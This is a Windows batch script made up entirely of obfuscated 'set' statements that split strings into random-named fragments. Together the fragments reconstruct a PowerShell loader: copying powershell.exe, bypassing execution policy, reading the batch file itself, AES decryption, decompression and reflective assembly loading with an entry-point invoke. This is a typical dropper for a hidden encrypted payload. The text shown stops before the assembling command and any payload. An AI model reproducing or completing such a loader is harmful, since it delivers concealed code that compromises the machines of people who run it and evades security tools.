@echo off
set "EpTfPbeJwi=po"
set "KwHWZFincx=ow"
set "SBkDKaypgv=ll"
set "QbKvhOPyjw=y "
set "bNjcpYptza=:\"
set "LGjHvWGMem= /"
set "XBdwOMHIwa=co"
set "SzcNIudiLC=do"
set "bhXlzJkeKG=Wi"
set "JIUZlSxaqw=s\"
set "uLqgVsBoEa=we"
set "AIfNvpQrWg=xe"
set "JbcKqFAbmT=st"
set "YHopOHGjJG=\W"
set "swNwWRUnxI=in"
set "nheeLaaqUO=\v"
set "EkkkQLdzMi=ll"
set "BYqvPNsYgU=.e"
set "trpsvYbtZm=py"
set "SIPBGzEBHu=we"
set "NfUYjOGVfX=he"
set "epYUZNVmjz=32"
set "avlPfZbkbz= C"
set "OWAuMAGAYN=Sy"
set "yyxRSIBBYh=Po"
set "jiOhjuclVZ=he"
set "xtFHBcnUwW=0\"
set "dAaVYJTHsl=1."
set "JoRNUSIMyp=ws"
set "AXbnXeHhxk=em"
set "NBgIdBpoqO=nd"
set "gRXVYUBwDI=rs"
set "ExxgWdEaBd=rS"
set "HrBZZSMtIt= %~dp0"
set "DdUsdRyAaX=cd"
set "DUOfIQuiMr=V = "
set "AsncWzURNd=gVe."
set "qvMYAxeqkm=wEV."
set "tOKaQKHDmP=, (,"
set "zrUojzrfbU=[Sys"
set "rYxAyTqUer===')"
set "ZVurFCPwKh=ddin"
set "MNafFTOPqF=736u"
set "jHKYStHqAT=ring"
set "lupqmsSQBK=('%~f0'"
set "MxvGYDUrZv=ert]"
set "VxXKPXLmFr=16] "
set "MAatvMkWWY=;$OU"
set "CuEGgJAJPN='[-1"
set "xzcsYvkEWK=-1.."
set "CQYyDBIvKd=  $k"
set "xNrriEHAoi=sion"
set "NMTChfgkon=nage"
set "qWRmzysQAP=-nop"
set "usIcqpRfSL=; };"
set "WKDAtVnHcm=);$z"
set "mjbagdjYNO=n ''"
set "iqKSoDzmid= '')"
set "MGYQRhrLAa=();$"
set "AyIwzZMBLM=Syst"
set "mGgkjJzhBa=sRGM"
set "eBsnXhqoLX=[-1."
set "jwthYgHxzI=le  "
set "hObMNaVizL=ion."
set "QzuozrttUL=aAwf"
set "GmUTbenHUf=]::C"
set "gDGpMRCOPp=ecry"
set "imkUcCmJEy=RGMV"
set "WEIGUzVXqK=y.Ci"
set "mtIOsthQmU=O.Me"
set "bNJNWcTegg= [Sy"
set "xlWliCgrgO=nwwE"
set "tdsKBrlsWe=flec"
set "AFDQlyznPJ=Comp"
set "EXTDwIfdUq=New-"
set "czDhunYMcq= [Sy"
set "NaMDagUVeb=UgVe"
set "CmrMjExXbc=('da"
set "xeodAzUIbr=ct S"
set "jqmBZwSowH=embl"
set "TixMBANyCg=PxIg"
set "lIhgfstieX=k; }"
set "HrFCBwxrAx=tryP"
set "QVqRfOBjDc=comm"
set "yIBqszzXgG=..-1"
set "ikLraWbldo=.Key"
set "EZrcbnGxdJ=oint"
set "hjnmngfvQJ=PKCS"
set "FOJhMEyzRl=t Sy"
set "RszbxPIwdK=ddin"
set "GzgKeEwQrz=g.Pa"
set "BZrPLQFDVp=qGo "
set "ohRAKMzXjK=raph"
set "qVzcHsSwRG=Mode"
set "vaNKKoegTc=yTo("
set "UztvmBFKjd=XpLW"
set "nwWNJLJDRy=mS.D"
set "DXPOTuXatI='')("
set "HLBdjGLZMA=F'[-"
set "IkCNevvWPg=1] -"
set "ankwYtMNhq=.Dis"
set "NbqssYKBdz=wEV "
set "pHIwUKBrAJ=[Env"
set "KGdVqkEvVL=+hAO"
set "roMkbGevoO=Comp"
set "CmAeBDuFgh=iron"
set "oXRqfdVLJG=stem"
set "ptlIAREIvX=pres"
set "cnsdlnZSXV=ress"
set "yABjZLDRck=ionM"
set "FXPlIsOZeU=rans"
set "PaxImyCvzH=yste"
set "NximsCAQPj=ose("
set "AdlZTqwCWR=.Dis"
set "jaSIdIWDGW=qGo."
set "iooPHCgNnt= '')"
set "tfPJqGyrPR=:: '"
set "QvwMHzPWjR=orF'"
set "gwXOOsFGIu=and "
set "TcTxgGUFHW=Invo"
set "yLrMlNXDCM=pDZz"
set "qBrScHyavg=3HWs"
set "DPGuJyxsqy=.Ass"
set "CeqlUFDqcZ=ew-O"
set "pXbTVpJrTr=stem"
set "qOxaVhQeBk=..-1"
set "OQjbLGKSmG=Obje"
set "tMSIzVWJrz=onve"
set "KVAQJUDKnt=ss -"
set "jMrrzkJhCw=rity"
set "SGFbZNFaWE=nirt"
set "fQINbudcPP=join"
set "WcCWcikNen=pose"
set "vmBzwuSLGK=::De"
set "CrNdskduEL=ode]"
set "SLQFxkcaQT=$ztP"
set "lAuCWmLpfC=null"
set "eOoMctVNgC=lit("
set "TNnxiaoadr=Disp"
set "ZACVSuWOLq=3); "
set "peubhMLBlf=MV);"
set "eTHvykYqmk=ispo"
set "eBVvEfDpuD=ect "
set "LzQTPmvzOf=m.IO"
set "CnkKUDtMRm=ct S"
set "XRZIzrGHOI=.Cre"
set "jgkahQvuLU=form"
set "JjLEUyhyru=);$Q"
set "hzdbxUZnNI=);$Q"
set "ZUeOvvYWWo=7;$Q"
set "QzaaTFoeLw=]::("
set "PYlOubutAt= = ["
set "QcSOkDlkPL=Syst"
set "jSzJQbvnqn=Secu"
set "AvkFjgIYqs=rofi"
set "LaxJXhPAob=n ''"
set "ywxvsYKRMf=.-16"
set "gtrKJxcliw=$sRG"
set "zPFGszIQna=ress"
set "ASKGPLWlJH=isfL"
set "UOFjUTmhDY=Ig.I"
set "OUtSDeHtGN=S = "
set "kzeEdICPjG=bjec"
set "WQtBlrNjIS=.Com"
set "dwhNdcCFtV=();$"
set "fCsRFoooNM=;$WU"
set "VyhWOzuFLt=e]::"
set "JVoPEwyENQ=ptog"
set "chsXSKPKrP=ay()"
set "rDNjAcyRAU=daeR"
set "JMTbcgalaC=-ep "
set "JmUzRIdWsB=$WUe"
set "MeQlubeFZC=QPxI"
set "QUZASxSrfZ=egm."
set "JXsiUAXxPL=th('"
set "fwqWFzfNan=$Ayq"
set "ZHIsybuCYu=[Sys"
set "cEBzMLXhMA=m = "
set "jnxFLsWqfN=oryS"
set "SGZXrYXfEK=File"
set "FZeImxCAJU=fore"
set "LjueJhngKM=sRGM"
set "BHgwNuEPNE=tem."
set "KkcwyAyRYX=nM);"
set "UwGLwHmwjG==');"
set "kWqOShyLTA=($nw"
set "oEUJIzgKYA=).Sp"
set "vHMhYTDYqv=v4Ir"
set "ZifqiDHiHD='txe"
set "xBmYYOmcri=$MYL"
set "fvTSVYIwyS=yste"
set "jqfxjiOEFA=, $s"
set "oMYPJNikuP=ateD"
set "SJrLagqPkh=[IO."
set "ZRHjgFEyRk=o) {"
set "ZVmtOzghgp=-joi"
set "ncUkOUIppt== [S"
set "NAMMyUHRKZ=em.I"
set "mIsaxWVorL=tsWi"
set "hCQwSupuER=$ztP"
set "SggBqcJlvY=.Con"
set "ExfNsgGhXx=$QPx"
set "xMFvrwtdwR=am;$"
set "TSbxViMBpb=oL'["
set "HHutPQomBC== $Q"
set "aIfHflYbNF=);$I"
set "HcWtRuWHfJ=($nw"
set "TuAmTBvJzZ=g = "
set "weTRHUHixU='gni"
set "aokMuPzmTV=rity"
set "hbXpCxdbAs=grap"
set "BNwaUeqMrH=wfF "
set "fmgzFjgHAM='[-1"
set "TUwurQHMTx=ptor"
set "wcaFBDnzMt=UGTu"
set "zahvcudWVB=gth)"
set "pYnDSJviOK=[Sys"
set "laDBDPfmLE=morF"
set "uSarpMBoBY=)($s"
set "zMZrXFkugz=('%*'"
set "aKKEzwRBCv=tem."
set "lIlzmeaKaF=gm, "
set "FCDBblUzhB=Disp"
set "nMqruukKWH=sRGM"
set "tJAkBuCtAx=;$Ay"
set "gpyquUtbxt=gMod"
set "PYjeqanMzp='dqR"
set "uLylMlfNyR=mory"
set "bfVgdUSpeN=.Mem"
set "VdmQZYaSOC= New"
set "gAqXiISAXR=Fo7l"
set "zGgwLspUJF=tPnM"
set "HrJxHrsvPA=MV ="
set "QUIduAwQlN=e = "
set "IMCjmvRYGD=pose"
set "guXjFJBoRa=rt]:"
set "oxJJBVWqwH=Fina"
set "ZhsFmdVyWQ=New-"
set "uDDkGvPhRX=;$Ay"
set "ZpGYgUSVhw=ne);"
set "WvqrJoTZXC=vert"
